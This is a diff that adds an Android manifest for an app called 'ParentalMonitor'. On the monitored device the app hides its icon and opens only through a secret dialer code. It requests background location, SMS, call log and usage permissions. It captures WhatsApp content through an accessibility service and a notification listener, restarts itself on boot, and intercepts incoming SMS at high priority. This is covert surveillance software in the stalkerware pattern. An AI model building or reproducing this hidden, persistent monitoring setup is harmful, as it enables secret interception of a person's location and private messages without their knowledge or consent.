@@ -1,0 +1,177 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <!-- Location -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- SMS & Calls -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+    <!-- App Usage -->
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions" />
+
+    <!-- Background & Boot -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <!-- Network -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <!-- Notifications -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+        tools:ignore="ProtectedPermissions" />
+
+    <!-- Accessibility -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <application
+        android:name=".ParentalMonitorApp"
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:networkSecurityConfig="@xml/network_security_config"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.ParentalMonitor">
+
+        <!-- ============================================ -->
+        <!-- HIDDEN: No launcher intent filter            -->
+        <!-- Access via dialer code *#*#1234#*#*          -->
+        <!-- ============================================ -->
+
+        <!-- Main Activity (Hidden - accessible via secret code) -->
+        <activity
+            android:name=".ui.child.SetupActivity"
+            android:exported="true"
+            android:theme="@style/Theme.ParentalMonitor">
+            <intent-filter>
+                <action android:name="android.provider.action.SECRET_CODE" />
+                <data android:host="1234" />
+            </intent-filter>
+        </activity>
+
+        <!-- Status Activity (Hidden) -->
+        <activity
+            android:name=".ui.child.StatusActivity"
+            android:exported="false" />
+
+        <!-- Pairing Wait Activity (Hidden - shows 6-digit code) -->
+        <activity
+            android:name=".ui.child.PairingWaitActivity"
+            android:exported="false" />
+
+        <!-- Parent Dashboard (Normal launcher activity) -->
+        <activity
+            android:name=".ui.parent.DashboardActivity"
+            android:exported="true"
+            android:label="@string/app_name_parent">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Parent Activities -->
+        <activity android:name=".ui.parent.LocationActivity" android:exported="false" />
+        <activity android:name=".ui.parent.AppUsageActivity" android:exported="false" />
+        <activity android:name=".ui.parent.MessagesActivity" android:exported="false" />
+        <activity android:name=".ui.parent.CallsActivity" android:exported="false" />
+        <activity android:name=".ui.parent.SettingsActivity" android:exported="false" />
+        <activity android:name=".ui.parent.BatteryUsageActivity" android:exported="false" />
+        <activity android:name=".ui.parent.HomeGeofenceActivity" android:exported="false" />
+
+        <!-- Auth -->
+        <activity android:name=".ui.auth.LoginActivity" android:exported="false" />
+
+        <!-- Parent: Pair Device screen -->
+        <activity android:name=".ui.parent.PairDeviceActivity" android:exported="false" />
+
+        <!-- ============================================ -->
+        <!-- SERVICES                                     -->
+        <!-- ============================================ -->
+
+        <!-- Main Foreground Service -->
+        <service
+            android:name=".service.MainForegroundService"
+            android:exported="false"
+            android:foregroundServiceType="location|dataSync" />
+
+        <!-- WhatsApp Accessibility Service -->
+        <service
+            android:name=".service.WhatsAppAccessibilityService"
+            android:exported="false"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_config" />
+        </service>
+
+        <!-- WhatsApp Notification Listener -->
+        <service
+            android:name=".service.WhatsAppNotificationService"
+            android:exported="false"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.service.notification"
+                android:resource="@xml/notification_listener_config" />
+        </service>
+
+        <!-- ============================================ -->
+        <!-- RECEIVERS                                    -->
+        <!-- ============================================ -->
+
+        <!-- Boot Receiver - auto start after reboot -->
+        <receiver
+            android:name=".receiver.BootReceiver"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <!-- SMS Receiver - real-time incoming SMS -->
+        <receiver
+            android:name=".receiver.SmsReceiver"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Firebase Messaging Service -->
+        <service
+            android:name=".service.MonitoringMessagingService"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.google.firebase.MESSAGING_EVENT" />
+            </intent-filter>
+        </service>
+
+        <!-- Firebase Auth Activity -->
+        <meta-data
+            android:name="com.google.android.gms.version"
+            android:value="@integer/google_play_services_version" />
+
+    </application>
+
+</manifest>
